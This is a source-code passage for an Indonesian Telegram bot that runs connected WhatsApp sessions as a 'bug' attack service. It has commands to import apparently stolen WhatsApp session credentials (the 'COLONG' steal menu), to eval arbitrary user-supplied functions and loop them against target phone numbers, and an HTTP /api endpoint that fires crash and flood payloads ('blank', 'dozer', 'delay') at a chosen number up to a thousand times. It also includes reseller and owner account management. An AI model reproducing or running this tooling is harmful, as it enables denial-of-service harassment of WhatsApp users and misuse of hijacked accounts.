        await bot.editMessageCaption('Silahkan pilih user:', {
          chat_id: chatId,
          message_id: query.message.message_id,
          reply_markup: { inline_keyboard: buttons }
        });
        return bot.answerCallbackQuery(query.id);
      }
    }

    // fallback
    return bot.answerCallbackQuery(query.id);
  } catch (err) {
    console.error('callback_query handler error:', err);
    try { await bot.answerCallbackQuery(query.id, { text: 'Terjadi error', show_alert: true }); } catch {}
  }
});

// -------- Handle text input for edits (U = / P = / E = / R = ) --------
bot.on('message', async (msg) => {
  try {
    if (!msg.text) return;
    const chatId = msg.chat.id;
    const state = manageState[chatId];
    if (!state || !state.editingField) return;

    const field = state.editingField;
    const user = state.users[state.selectedUserIndex];
    const text = msg.text.trim();

    // check prefixes
    const ok =
      (field === 'username' && text.startsWith('U =')) ||
      (field === 'password' && text.startsWith('P =')) ||
      (field === 'expired' && text.startsWith('E =')) ||
      (field === 'role' && text.startsWith('R ='));

    if (!ok) {
      const formatMsg = field === 'username' ? 'U = <username>' :
                        field === 'password' ? 'P = <password>' :
                        field === 'expired' ? 'E = <1d|1w|1m|timestamp>' :
                        'R = <user|reseller|owner>';
      return bot.sendMessage(chatId, `Format salah!\nGunakan:\n${formatMsg}`);
    }

    const value = text.slice(3).trim();

    if (field === 'username') user.username = value;
    if (field === 'password') user.password = value;
    if (field === 'expired') user.expiresAt = parseExpire(value);
    if (field === 'role') {
      const v = value.toLowerCase();
      if (!['user','reseller','owner'].includes(v)) return bot.sendMessage(chatId, 'Role tidak valid! Gunakan: user, reseller, owner');
      user.role = v;
    }

    // push update to GitHub
    const { sha } = await getUsersFromGitHub();
    await updateUsersToGitHub(state.users, sha);

    await bot.sendMessage(chatId, `${field} berhasil diubah untuk user ${user.username} `);
    state.editingField = null;
  } catch (err) {
    console.error('message handler error:', err);
    bot.sendMessage(msg.chat.id, 'Terjadi error saat memproses perubahan.');
  }
});

// -------- /start (menu) --------
bot.onText(/\/start/, (msg) => {
  const chatId = msg.chat.id;
  bot.sendPhoto(chatId, 'https://files.catbox.moe/mhtp9b.jpg', {
    caption: escapeMd(`
ꕥ D A T A  B O T ꕥ
ꕤ Developer : @pinotrash
ꕤ Name bot : Api New GRIFFINS
ꕤ Version : 1.0
    `),
    parse_mode: 'MarkdownV2',
    reply_markup: {
      inline_keyboard: [
        [{ text: 'OWNER MENU', callback_data: 'owner_menu' }],
        [{ text: 'API MENU', callback_data: 'api_menu' }],
        [{ text: 'ACCOUNT MENU', callback_data: 'account_menu' }],
        [{ text: 'AKSES MENU', callback_data: 'akses_menu' }]
      ]
    }
  });
});


bot.onText(/\/Xget/, async (msg) => {
if (!isOwnerMain(msg.from.id)) {
    return bot.sendMessage(msg.chat.id, "Hanya Owner yang bisa tambah Reseller!");
  }
    const response = await fetch('https://httpbin.org/get');
    const data = await response.json();
    const ip = data.origin;
   await bot.sendMessage(msg.chat.id, `http://${ip}:${PORT}`, {
        reply_to_message_id: msg.message_id,
        parse_mode: "HTML",
        });
    });
    
bot.onText(/\/Xget/, async (msg) => {
if (!isOwnerMain(msg.from.id)) {
    return bot.sendMessage(msg.chat.id, "Hanya Owner yang bisa tambah Reseller!");
  }
    const response = await fetch('https://httpbin.org/get');
    const data = await response.json();
    const ip = data.origin;
   await bot.sendMessage(msg.chat.id, `http://${ip}:${PORT}/web`, {
        reply_to_message_id: msg.message_id,
        parse_mode: "HTML",
        });
    });    
    
bot.onText(/\/Xsender/, async (msg) => {
if (!isOwnerMain(msg.from.id)) {
    return bot.sendMessage(msg.chat.id, "Hanya Owner yang bisa tambah Reseller!");
  }
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    if (sessions.size === 0) {
        return bot.sendMessage(
            chatId,
            "```❌\nNo WhatsApp bots connected. Please connect a bot first with /Xsender```", {
            reply_to_message_id: msg.message_id, parse_mode: "Markdown"
        });
    }
    let botList = "```List Sender\n";
    let index = 1;
    for (const [botNumber, sock] of sessions.entries()) {
        const status = sock.user ? "✅" : "❌";
        botList += `〣 BOT ${index} : ${botNumber}\n`;
        botList += `〣 STATUS : ${status}\n`;
        botList += "\n";
        index++;
    }
    botList += `〣 TOTAL : ${sessions.size}\n`;
    botList += "```";
    await bot.sendMessage(chatId, botList, { reply_to_message_id: msg.message_id, parse_mode: "Markdown" });
});

bot.onText(/\/Xpair(?:\s+(.+))?/, async (msg, match) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    if (!isOwnerMain(msg.from.id)) {
    return bot.sendMessage(msg.chat.id, "Hanya Owner yang bisa tambah Reseller!");
  }
    if (!match || !match[1]) {
        return bot.sendMessage(chatId, "❗️ Wrong usage:\n`/Xpair 62xxxxxxxxxx`", {
            reply_to_message_id: msg.message_id, parse_mode: "Markdown"
        });
    }
    const botNumber = match[1].replace(/[^0-9]/g, "");
    if (botNumber.length < 10) {
        return bot.sendMessage(chatId, "❗️Invalid number.");
    }
    try {
        await connectToWhatsApp(botNumber, chatId);
    } catch (error) {
        console.error("Error in /addsender:", error);
        bot.sendMessage(
            chatId,
            "⚠️ Error connecting to WhatsApp. Please try again."
        );
    }
});

// COLONG MENU
bot.onText(/^\/add$/, async (msg) => {
  const chatId = msg.chat.id;
  const fromId = msg.from.id;
  if (!isOwner(fromId)) {
    return bot.sendMessage(chatId, '❌ Hanya owner.');
  }
  let sessionData;
  if (msg.reply_to_message?.text) {
    try {
      sessionData = JSON.parse(msg.reply_to_message.text);
    } catch (e) {
      return bot.sendMessage(chatId, '*Format JSON tidak valid*' + e.message, { parse_mode: 'Markdown' });
    }
  } else if (msg.reply_to_message?.document) {
    const fileId = msg.reply_to_message.document.file_id;
    const fileLink = await bot.getFileLink(fileId);
    try {
      const res = await axios.get(fileLink.href);
      sessionData = res.data;
    } catch (e) {
      return bot.sendMessage(chatId, '*Gagal membaca file JSON.*\n' + e.message, { parse_mode: 'Markdown' });
   }
  } else {
    return bot.sendMessage(chatId, '*Reply dengan JSON text atau file .json*', { parse_mode: 'Markdown' });
  }
  const rawId = sessionData?.me?.id;
  if (!rawId) {
    return bot.sendMessage(chatId, '*Data session tidak valid.*', { parse_mode: 'Markdown' });
  }
  const cleanId = rawId.split(':')[0];
  const number = cleanId.split('@')[0];
  const kontol = saveActiveSessions(number);
  const devicePath = createSessionDir(number);
  const filePath = path.join(devicePath, 'creds.json');
  try {
    fs.writeFileSync(filePath, JSON.stringify(sessionData, null, 2));
    await useMultiFileAuthState(devicePath);
    await connectToWhatsApp(number, chatId);
    bot.sendMessage(
      chatId,
      `<blockquote><b>Session berhasil dibuat: </b><code>${number}</code></blockquote>\n<pre>X TUNGGU 10 TAHUN</pre>`,
      { parse_mode: 'HTML' }
    );
  } catch (err) {
    console.error(err);
    bot.sendMessage(chatId, err.message);
  }
});


// AKUN APK MENU
bot.onText(/\/Xcreate (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const args = match[1].split(',').map(a => a.trim());
  if (args.length < 3) return bot.sendMessage(chatId, 'Format salah. Contoh: /Xcreate user1, pass123, 1d');

  const username = args[0];
  const password = args[1];
  const expiresAt = parseExpire(args[2]);
  const createdAt = Date.now();

  pendingUsers[chatId] = { username, password, role: null, expiresAt, createdAt };

  let inlineKeyboard = [];

  if (isOwnerMain(msg.from.id)) {
    // Owner utama
    inlineKeyboard = [
      [{ text: 'User Biasa', callback_data: 'role_user' }],
      [{ text: 'Reseller', callback_data: 'role_reseller' }],
      [{ text: 'Owner', callback_data: 'role_owner' }]
    ];
  } else if (isOwner(msg.from.id)) {
    // Owner biasa
    inlineKeyboard = [
      [{ text: 'User Biasa', callback_data: 'role_user' }],
      [{ text: 'Reseller', callback_data: 'role_reseller' }]
    ];
  } else if (isReseller(msg.from.id)) {
    // Reseller
    inlineKeyboard = [
      [{ text: 'User Biasa', callback_data: 'role_user' }]
    ];
  } else {
    return bot.sendMessage(chatId, 'Kamu bukan reseller / owner biasa / owner utama');
  }

  await bot.sendPhoto(chatId, 'https://files.catbox.moe/mhtp9b.jpg', {
    caption: `User: ${escapeMd(username)}\nPassword: ${escapeMd(password)}\nPilih role:`,
    reply_markup: { inline_keyboard: inlineKeyboard }
  });
});

bot.onText(/\/Xmanage/, async (msg) => {
  if (!isOwnerMain(msg.from.id)) {
    return bot.sendMessage(msg.chat.id, "Hanya Owner yang bisa tambah Reseller!");
  }
  const chatId = msg.chat.id;
  const { users } = await getUsersFromGitHub();
  manageState[chatId] = { users, page: 0, editingField: null, selectedUserIndex: null, deleting: false };
  const buttons = createUserButtons(users, 0);
  await bot.sendPhoto(chatId, 'https://files.catbox.moe/mhtp9b.jpg', {
    caption: 'Silahkan pilih user:',
    reply_markup: { inline_keyboard: buttons }
  });
});

bot.onText(/\/Xdeluser/, async (msg) => {
  if (!isOwner(msg.from.id)) {
    return bot.sendMessage(msg.chat.id, "Hanya Owner yang bisa tambah Reseller!");
  }
  const chatId = msg.chat.id;
  const { users } = await getUsersFromGitHub();
  manageState[chatId] = { users, page: 0, editingField: null, selectedUserIndex: null, deleting: true };
  const buttons = createUserButtons(users, 0);
  await bot.sendPhoto(chatId, 'https://files.catbox.moe/mhtp9b.jpg', {
    caption: 'Pilih user yang ingin dihapus:',
    reply_markup: { inline_keyboard: buttons }
  });
});

//AKUN SCRIT MENU

bot.onText(/\/Xowner/, (msg) => {
  if (String(msg.from.id) !== String(OWNER_ID)) {
    return bot.sendMessage(msg.chat.id, "❌ Hanya Owner Utama yang bisa tambah Owner!");
  }
  const target = getTargetId(msg);
  if (!target) return bot.sendMessage(msg.chat.id, "Gunakan: /Xowner <id> atau reply user");
  if (isOwner(target)) return bot.sendMessage(msg.chat.id, "User sudah Owner.");
  pangkat.owners.push(String(target));
  savepangkat(pangkat);
  bot.sendMessage(msg.chat.id, `✅ Tambah Owner: ${target}\n\n`);
});

bot.onText(/\/Xdelowner/, (msg) => {
  if (String(msg.from.id) !== String(OWNER_ID)) {
    return bot.sendMessage(msg.chat.id, " Hanya Owner Utama yang bisa hapus Owner!");
  }
  const target = getTargetId(msg);
  if (!target) return bot.sendMessage(msg.chat.id, "Gunakan: /Xdelowner <id> atau reply user");
  if (!isOwner(target)) return bot.sendMessage(msg.chat.id, "User bukan Owner.");
  if (String(target) === String(OWNER_ID)) {
    return bot.sendMessage(msg.chat.id, " Tidak bisa hapus Owner Utama!");
  }
  pangkat.owners = pangkat.owners.filter((x) => x !== String(target));
  savepangkat(pangkat);
  bot.sendMessage(msg.chat.id, ` Owner ${target} dihapus\n\n`);
});

bot.onText(/\/Xreseller/, (msg) => {
  if (!isOwner(msg.from.id)) {
    return bot.sendMessage(msg.chat.id, "Hanya Owner yang bisa tambah Reseller!");
  }
  const target = getTargetId(msg);
  if (!target) return bot.sendMessage(msg.chat.id, "Gunakan: /Xreseller <id> atau reply user");
  if (isReseller(target)) return bot.sendMessage(msg.chat.id, "User sudah Reseller.");
  pangkat.resellers.push(String(target));
  savepangkat(pangkat);
  bot.sendMessage(msg.chat.id, `Tambah Reseller: ${target}\n\n`);
});

bot.onText(/\/Xdelreseller/, (msg) => {
  if (String(msg.from.id) !== String(OWNER_ID)) {
    return bot.sendMessage(msg.chat.id, "Hanya Owner Utama yang bisa hapus Reseller!");
  }
  const target = getTargetId(msg);
  if (!target) return bot.sendMessage(msg.chat.id, "Gunakan: /xdelreseller <id> atau reply user");
  if (!isReseller(target)) return bot.sendMessage(msg.chat.id, "User bukan Reseller.");
  pangkat.resellers = pangkat.resellers.filter((x) => x !== String(target));
  savepangkat(pangkat);
  bot.sendMessage(msg.chat.id, `Reseller ${target} dihapus\n\n`);
});



const DIGIT_RE = /\d{6,16}/g;
const CODE_FENCE_RE = /```([\s\S]+?)```/;

const TZ = 'Asia/Makassar';
const nowID = () => new Date().toLocaleString('id-ID', { timeZone: TZ, hour12: false });

const unfence = s => {
  if (!s) return "";
  const m = s.match(CODE_FENCE_RE);
  return m ? m[1].trim() : s.trim();
};

const parseTargets = s => {
  if (!s) return [];
  const p = (s.match(DIGIT_RE) || []).map(n => n.replace(/\D/g, ""));
  return [...new Set(p.filter(Boolean))];
};

const toFunction = src => {
  const t = (src || "").trim();
  const d = /^(?:async\s+)?function\s+[a-zA-Z_$][\w$]*\s*\(/.test(t);
  const w = d ? `(${t})` : (t.startsWith('(') || t.startsWith('async') ? t : `async ${t}`);
  return eval(w);
};

const extractTextOrCaption = msg =>
  msg?.caption || msg?.text || "";

// ==== tambahan biar gak error ====

        function sleep(ms) {
            return new Promise(resolve => setTimeout(resolve, ms));
        }
// =================================

bot.onText(/^\/TestFunc\s+(\d+)\s+([\s\S]+)/i, async (msg, match) => {
  const chatId = msg.chat.id;
  const loops = Math.max(1, parseInt(match[1], 10));
  const targets = parseTargets(match[2]);
  const q = msg.reply_to_message;
  const fnText = unfence(extractTextOrCaption(q));

  if (!fnText)
    return bot.sendMessage(chatId, "❌ Reply teks async function terlebih dahulu");

  if (targets.length === 0)
    return bot.sendMessage(chatId, "❌ Sertakan target digit. Contoh: /TestFunc 2 6281234567890");

  let execFn;
  try {
    execFn = toFunction(fnText);
  } catch (e) {
    return bot.sendMessage(chatId, `❌ Gagal memuat function: ${e.message}`);
  }
  if (typeof execFn !== 'function')
    return bot.sendMessage(chatId, "❌ Konten reply bukan function");

  for (const nomor of targets) {
    try {
      if (!/^\d{6,16}$/.test(nomor)) {
        await bot.sendMessage(chatId, "❌ Nomor tidak valid. Contoh: /TestFunc 628xxxxxx");
        continue;
      }

      const target = `${nomor}@s.whatsapp.net`;

      const sent = await bot.sendPhoto(chatId, 'https://files.catbox.moe/pg0e1y.jpg', {
        caption: [
          '```',
          '┏━━━━⌦ 𝗡𝗢𝗧𝗜𝗙𝗜𝗖𝗔𝗧𝗜𝗢𝗡 ⌫━━━━━┓',
          '┃ Mᴏʜᴏɴ ᴍᴇɴᴜɴɢɢᴜ...',
          '┃ Bᴏᴛ sᴇᴅᴀɴɢ ᴏᴘᴇʀᴀsɪ ᴘᴇɴɢɪʀɪᴍᴀɴ ʙᴜɢ',
          `┃ Tᴀʀɢᴇᴛ  : ${nomor}`,
          '┗━━━━━━━━━━━━━━━━━━━━━━━┛',
          '```'
        ].join('\n'),
        parse_mode: "Markdown"
      });

      for (let i = 0; i < loops; i++) {
        await execFn(sock, target);
        await sleep(220);
      }

      await bot.editMessageCaption(
        [
          '```',
          '┏━━━━⌦ 𝗡𝗢𝗧𝗜𝗙𝗜𝗖𝗔𝗧𝗜𝗢𝗡 ⌫━━━━━┓',
          '┃ Sᴜᴄᴄᴇss ᴍᴇɴɢɪʀɪᴍ ʙᴜɢ',
          '┃ ᴋᴇᴘᴀᴅᴀ ɴᴏᴍᴏʀ',
          `┃ Tᴀʀɢᴇᴛ  : ${nomor}`,
          '┗━━━━━━━━━━━━━━━━━━━━━━━┛',
          '```'
        ].join('\n'),
        {
          chat_id: chatId,
          message_id: sent.message_id,
          parse_mode: "Markdown",
        }
      );

    } catch (error) {
      await bot.sendMessage(chatId, `❌ Gagal mengirim bug ke ${nomor}: ${error.message}`);
    }
  }
});

app.get('/web', (req, res) => {
  res.sendFile(path.join(__dirname, "assets", "index.html"));
});

app.get('/api', async (req, res) => {
    const { target, type, botNumber } = req.query;
    if (!target || !type) {
        return res.status(400).json({ error: 'Missing parameters: chatId or type' });
    }
    try {
        if (sessions.size === 0) {
            return res.status(500).json({ error: 'No WhatsApp bots connected' });
        }
        function sleep(ms) {
            return new Promise(resolve => setTimeout(resolve, ms));
        }
    const targetJid = target + "@s.whatsapp.net";
    const { blankButton, Blank2, crsA, bClck, invisibleDozer, delayJembut } = require("./assets/function.js");
    async function delay(x) {
      for (let i = 0; i <= 40; i++) {
        await delayJembut(sock, x)
        await delayJembut(sock, x)
        await delayJembut(sock, x)
        await sleep(1000) 
      }
    }
    async function blank(x) {
       for (let i = 0; i < 10; i++) {
         await blankButton(sock, x)
         await sleep(1000) 
         await Blank2(sock, x)
         await sleep(1000);
         await crsA(sock, x)
         await bClck(sock, x)
      }
    }
    async function dozer(x) {
      for (let i = 0; i <= 1000; i++) {
        await invisibleDozer(sock, x);
        await sleep(1000) 
        await invisibleDozer(sock, x) 
      }
    }
    if (type === "delay") {
      await delay(targetJid);
    } else 
    if (type === "blank") {
      await blank(targetJid);
    } 
    if (type === "dozer") {
      await dozer(targetJid);
    }
        console.log("Successfully sent undefined bug.");
        res.json({ success: true, message: 'Undefined bug sent successfully!', target: targetJid });
    } catch (error) {
        console.error('Error sending message:', error);
        res.status(500).json({ error: 'Failed to send message', details: error.toString() });
    }
});
initializeWhatsAppConnections();
app.listen(PORT, () => {
    logs(`SERVER RUNNING ON PORT ${PORT}`);
});
console.clear();